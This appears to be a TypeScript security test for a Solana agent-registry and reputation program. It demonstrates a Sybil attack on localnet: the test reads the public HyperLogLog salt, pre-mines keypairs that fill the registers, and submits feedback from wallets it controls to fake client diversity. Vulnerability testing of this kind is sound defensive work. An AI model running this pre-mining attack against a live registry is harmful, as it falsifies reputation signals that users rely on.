/**
 * ATOM Engine - HLL Bucket Stuffing Attack Test
 *
 * Tests the vulnerability where an attacker can pre-compute keypairs that
 * saturate the HLL registers to fake diversity.
 *
 * Attack Vector:
 * 1. Read hll_salt from AtomStats (it's public on-chain!)
 * 2. Pre-compute ~48-100 keypairs that hit all 256 HLL registers with high rho
 * 3. Submit feedbacks with these keypairs
 * 4. HLL estimate shows high unique count despite only using controlled wallets
 * 5. Agent gets high diversity_ratio, bypassing Sybil detection
 *
 * Cost: ~0.01 SOL + GPU compute for pre-mining
 */
import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { AgentRegistry8004 } from "../target/types/agent_registry_8004";
import { AtomEngine } from "../target/types/atom_engine";
import { Keypair, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { expect } from "chai";
import * as crypto from "crypto";

import {
  MPL_CORE_PROGRAM_ID,
  ATOM_ENGINE_PROGRAM_ID,
  getRootConfigPda,
  getAgentPda,
  getAtomStatsPda,
  getAtomConfigPda,
  getRegistryAuthorityPda,
  fundKeypair,
  fundKeypairs,
  returnFunds,
} from "./utils/helpers";
import { generateClientHash } from "./utils/attack-helpers";

// HLL Constants (must match atom-engine/src/params.rs)
const HLL_REGISTERS = 256;
const HLL_MAX_RHO = 15;

describe("ATOM HLL Bucket Stuffing", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace.AgentRegistry8004 as Program<AgentRegistry8004>;
  const atomProgram = anchor.workspace.AtomEngine as Program<AtomEngine>;

  let rootConfigPda: PublicKey;
  let registryConfigPda: PublicKey;
  let collectionPubkey: PublicKey;
  let atomConfigPda: PublicKey;
  let registryAuthorityPda: PublicKey;

  const allFundedKeypairs: Keypair[] = [];
  const FUND_AMOUNT = 0.05 * LAMPORTS_PER_SOL;

  before(async () => {
    [rootConfigPda] = getRootConfigPda(program.programId);
    [atomConfigPda] = getAtomConfigPda();
    [registryAuthorityPda] = getRegistryAuthorityPda(program.programId);

    const rootAccountInfo = await provider.connection.getAccountInfo(rootConfigPda);
    if (!rootAccountInfo) {
      throw new Error("Root config not initialized. Run init-localnet.ts first");
    }

    const rootConfig = program.coder.accounts.decode("rootConfig", rootAccountInfo.data);
    registryConfigPda = rootConfig.baseRegistry;

    const registryAccountInfo = await provider.connection.getAccountInfo(registryConfigPda);
    const registryConfig = program.coder.accounts.decode("registryConfig", registryAccountInfo!.data);
    collectionPubkey = registryConfig.collection;

    console.log("=== HLL Bucket Stuffing Attack Test ===");
    console.log("Collection:", collectionPubkey.toBase58());
  });

  after(async () => {
    if (allFundedKeypairs.length > 0) {
      console.log(`\nReturning funds from ${allFundedKeypairs.length} test wallets...`);
      const returned = await returnFunds(provider, allFundedKeypairs);
      console.log(`Returned ${(returned / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
    }
  });

  // Helper to create and register an agent
  async function createAgent(owner: Keypair): Promise<{ agent: Keypair; agentPda: PublicKey; statsPda: PublicKey }> {
    const agent = Keypair.generate();
    const [agentPda] = getAgentPda(agent.publicKey, program.programId);
    const [statsPda] = getAtomStatsPda(agent.publicKey);

    await program.methods
      .register(`https://hll-test.local/agent/${agent.publicKey.toBase58().slice(0, 8)}`)
      .accounts({
        registryConfig: registryConfigPda,
        agentAccount: agentPda,
        asset: agent.publicKey,
        collection: collectionPubkey,
        owner: owner.publicKey,
        systemProgram: SystemProgram.programId,
        mplCoreProgram: MPL_CORE_PROGRAM_ID,
      })
      .signers([agent, owner])
      .rpc();

    await atomProgram.methods
      .initializeStats()
      .accounts({
        owner: owner.publicKey,
        asset: agent.publicKey,
        collection: collectionPubkey,
        config: atomConfigPda,
        stats: statsPda,
        systemProgram: SystemProgram.programId,
      })
      .signers([owner])
      .rpc();

    return { agent, agentPda, statsPda };
  }

  // Helper to give feedback
  async function giveFeedback(
    client: Keypair,
    asset: PublicKey,
    agentPda: PublicKey,
    statsPda: PublicKey,
    score: number,
    index: number
  ): Promise<void> {
    const clientHash = generateClientHash(client);

    await program.methods
      .giveFeedback(
        score,
        "hll",
        "stuff",
        "https://hll-test.local/api",
        `https://hll-test.local/fb/${index}`,
        Array.from(clientHash),
        new anchor.BN(index)
      )
      .accounts({
        client: client.publicKey,
        asset: asset,
        collection: collectionPubkey,
        agentAccount: agentPda,
        atomConfig: atomConfigPda,
        atomStats: statsPda,
        atomEngineProgram: ATOM_ENGINE_PROGRAM_ID,
        registryAuthority: registryAuthorityPda,
        systemProgram: SystemProgram.programId,
      })
      .signers([client])
      .rpc();
  }

  // Helper to get stats
  async function getStats(statsPda: PublicKey): Promise<any> {
    return await atomProgram.account.atomStats.fetch(statsPda);
  }

  // Compute HLL register and rho for a client hash with salt
  function computeHllRegisterAndRho(
    clientHash: Uint8Array,
    asset: PublicKey,
    salt: bigint
  ): { register: number; rho: number } {
    // salt_hash_with_asset: XOR client_hash with asset bytes
    const assetBytes = asset.toBytes();
    const saltedHash = new Uint8Array(32);
    for (let i = 0; i < 32; i++) {
      saltedHash[i] = clientHash[i] ^ assetBytes[i];
    }

    // hll_add uses: h_raw = u64::from_le_bytes(client_hash[0..8])
    // then h = h_raw ^ salt
    let hRaw = BigInt(0);
    for (let i = 0; i < 8; i++) {
      hRaw |= BigInt(saltedHash[i]) << BigInt(i * 8);
    }
    const h = hRaw ^ salt;

    // idx = h % HLL_REGISTERS
    const register = Number(h % BigInt(HLL_REGISTERS));

    // rho calculation
    const remaining = h / BigInt(HLL_REGISTERS);
    let rho: number;
    if (remaining === BigInt(0)) {
      rho = HLL_MAX_RHO;
    } else {
      const leadingZeros = 64 - remaining.toString(2).length;
      rho = Math.min(leadingZeros + 1, HLL_MAX_RHO);
    }

    return { register, rho };
  }

  // Pre-mine keypairs that saturate HLL registers
  function preMineKeypairs(
    asset: PublicKey,
    salt: bigint,
    targetRegisters: number = HLL_REGISTERS,
    maxAttempts: number = 500000
  ): { keypairs: Keypair[]; registersCovered: Set<number> } {
    const keypairs: Keypair[] = [];
    const registersCovered = new Set<number>();
    const registerHighestRho = new Map<number, { keypair: Keypair; rho: number }>();

    console.log(`Pre-mining keypairs for ${targetRegisters} registers...`);
    const startTime = Date.now();

    for (let i = 0; i < maxAttempts && registersCovered.size < targetRegisters; i++) {
      const keypair = Keypair.generate();
      const clientHash = generateClientHash(keypair);
      const { register, rho } = computeHllRegisterAndRho(clientHash, asset, salt);

      // Keep the keypair with highest rho for each register
      const existing = registerHighestRho.get(register);
      if (!existing || rho > existing.rho) {
        registerHighestRho.set(register, { keypair, rho });
        registersCovered.add(register);
      }

      if (i % 50000 === 0) {
        console.log(`  Attempt ${i}: ${registersCovered.size}/${targetRegisters} registers covered`);
      }
    }

    const elapsed = Date.now() - startTime;
    console.log(`Pre-mining complete in ${elapsed}ms: ${registersCovered.size}/${targetRegisters} registers`);

    // Collect the best keypairs
    for (const { keypair } of registerHighestRho.values()) {
      keypairs.push(keypair);
    }

    return { keypairs, registersCovered };
  }

  describe("Phase 1: Demonstrate Salt Visibility", () => {
    let owner: Keypair;
    let agent: { agent: Keypair; agentPda: PublicKey; statsPda: PublicKey };

    before(async () => {
      owner = Keypair.generate();
      await fundKeypair(provider, owner, FUND_AMOUNT);
      allFundedKeypairs.push(owner);

      agent = await createAgent(owner);

      // Give one feedback to initialize the salt
      const initClient = Keypair.generate();
      await fundKeypair(provider, initClient, FUND_AMOUNT);
      allFundedKeypairs.push(initClient);
      await giveFeedback(initClient, agent.agent.publicKey, agent.agentPda, agent.statsPda, 100, 0);
    });

    it("should show hll_salt is readable on-chain", async () => {
      console.log("\n=== Demonstrating Salt Visibility ===");

      const stats = await getStats(agent.statsPda);
      console.log(`hll_salt (readable): ${stats.hllSalt.toString()}`);
      console.log(`asset: ${agent.agent.publicKey.toBase58()}`);

      // VULNERABILITY: Salt is public!
      expect(stats.hllSalt.toString()).to.not.equal("0");
      console.log("\n[!] VULNERABILITY: hll_salt is readable on-chain");
      console.log("[!] Attacker can read salt and pre-compute optimal keypairs");
    });
  });

  describe("Phase 2: Pre-Mining Attack", () => {
    let owner: Keypair;
    let agent: { agent: Keypair; agentPda: PublicKey; statsPda: PublicKey };
    let preminedKeypairs: Keypair[];
    let salt: bigint;

    before(async () => {
      owner = Keypair.generate();
      await fundKeypair(provider, owner, FUND_AMOUNT);
      allFundedKeypairs.push(owner);

      agent = await createAgent(owner);

      // Give one feedback to initialize the salt
      const initClient = Keypair.generate();
      await fundKeypair(provider, initClient, FUND_AMOUNT);
      allFundedKeypairs.push(initClient);
      await giveFeedback(initClient, agent.agent.publicKey, agent.agentPda, agent.statsPda, 100, 0);

      // Read the salt
      const stats = await getStats(agent.statsPda);
      salt = BigInt(stats.hllSalt.toString());
      console.log(`\nRead salt: ${salt}`);

      // Pre-mine keypairs for this salt (target 50 registers for speed)
      const result = preMineKeypairs(agent.agent.publicKey, salt, 50, 100000);
      preminedKeypairs = result.keypairs;

      console.log(`Pre-mined ${preminedKeypairs.length} keypairs`);

      // Fund them
      await fundKeypairs(provider, preminedKeypairs, FUND_AMOUNT);
      allFundedKeypairs.push(...preminedKeypairs);
    });

    it("should achieve high diversity with pre-mined keypairs", async () => {
      console.log("\n=== Pre-Mining Attack ===");

      const statsBefore = await getStats(agent.statsPda);
      console.log(`Before attack: feedbacks=${statsBefore.feedbackCount}, diversity=${statsBefore.diversityRatio}`);

      // Submit feedbacks with pre-mined keypairs
      for (let i = 0; i < preminedKeypairs.length; i++) {
        await giveFeedback(
          preminedKeypairs[i],
          agent.agent.publicKey,
          agent.agentPda,
          agent.statsPda,
          100,
          i + 1
        );

        if ((i + 1) % 10 === 0) {
          const stats = await getStats(agent.statsPda);
          console.log(`  After ${i + 1} feedbacks: diversity=${stats.diversityRatio}`);
        }
      }

      const statsAfter = await getStats(agent.statsPda);
      console.log(`\nAfter attack:`);
      console.log(`  Feedback count: ${statsAfter.feedbackCount}`);
      console.log(`  Diversity ratio: ${statsAfter.diversityRatio}`);
      console.log(`  Quality score: ${statsAfter.qualityScore}`);
      console.log(`  Trust tier: ${statsAfter.trustTier}`);
      console.log(`  Risk score: ${statsAfter.riskScore}`);

      // Calculate HLL estimate from packed registers
      const hllEstimate = estimateHll(statsAfter.hllPacked);
      console.log(`  HLL estimate: ~${hllEstimate} unique clients`);
      console.log(`  Actual controlled wallets: ${preminedKeypairs.length}`);

      // VULNERABILITY: Diversity looks good despite all wallets being controlled
      if (statsAfter.diversityRatio > 100) {
        console.log("\n[!] VULNERABILITY CONFIRMED!");
        console.log(`[!] High diversity (${statsAfter.diversityRatio}/255) with only ${preminedKeypairs.length} controlled wallets`);
        console.log("[!] HLL was stuffed with pre-computed keypairs");
      }
    });
  });

  describe("Phase 3: Comparison with Random Wallets", () => {
    let owner: Keypair;
    let agentRandom: { agent: Keypair; agentPda: PublicKey; statsPda: PublicKey };
    let randomKeypairs: Keypair[];

    before(async () => {
      owner = Keypair.generate();
      await fundKeypair(provider, owner, FUND_AMOUNT);
      allFundedKeypairs.push(owner);

      agentRandom = await createAgent(owner);

      // Generate 50 random keypairs (no pre-mining)
      console.log("Generating 50 random keypairs (no pre-mining)...");
      randomKeypairs = [];
      for (let i = 0; i < 50; i++) {
        randomKeypairs.push(Keypair.generate());
      }
      await fundKeypairs(provider, randomKeypairs, FUND_AMOUNT);
      allFundedKeypairs.push(...randomKeypairs);
    });

    it("should compare pre-mined vs random HLL coverage", async () => {
      console.log("\n=== Random Wallets Comparison ===");

      // Submit feedbacks with random keypairs
      for (let i = 0; i < randomKeypairs.length; i++) {
        await giveFeedback(
          randomKeypairs[i],
          agentRandom.agent.publicKey,
          agentRandom.agentPda,
          agentRandom.statsPda,
          100,
          i
        );
      }

      const stats = await getStats(agentRandom.statsPda);
      console.log(`With 50 random wallets:`);
      console.log(`  Diversity ratio: ${stats.diversityRatio}`);
      console.log(`  HLL estimate: ~${estimateHll(stats.hllPacked)}`);

      // Random wallets should have similar coverage due to birthday paradox
      // but pre-mined can guarantee maximum rho values
      console.log("\n[*] Random wallets achieve similar diversity by chance");
      console.log("[*] Pre-mining gives attacker CONTROL over which registers get high rho");
      console.log("[*] This makes fake diversity indistinguishable from real diversity");
    });
  });

  // Helper to estimate HLL count from packed registers
  function estimateHll(hllPacked: number[]): number {
    const INV_TAB = [65535, 32768, 16384, 8192, 4096, 2048, 1024, 512, 256, 128, 64, 32, 16, 8, 4, 2];
    let invSum = 0;
    let zeros = 0;

    for (const byte of hllPacked) {
      const lo = byte & 0x0F;
      const hi = (byte >> 4) & 0x0F;

      invSum += INV_TAB[lo] || 1;
      invSum += INV_TAB[hi] || 1;

      if (lo === 0) zeros++;
      if (hi === 0) zeros++;
    }

    // Alpha constant for 256 registers
    const HLL_ALPHA_M2_SCALED = 3045994599;
    const raw = Math.floor(HLL_ALPHA_M2_SCALED / invSum);

    // Linear counting for small cardinalities
    if (raw < 640 && zeros > 0) {
      if (zeros >= 256) return 0;
      return Math.min(raw, Math.floor((8 - Math.log2(zeros)) * 177));
    }

    return raw;
  }
});
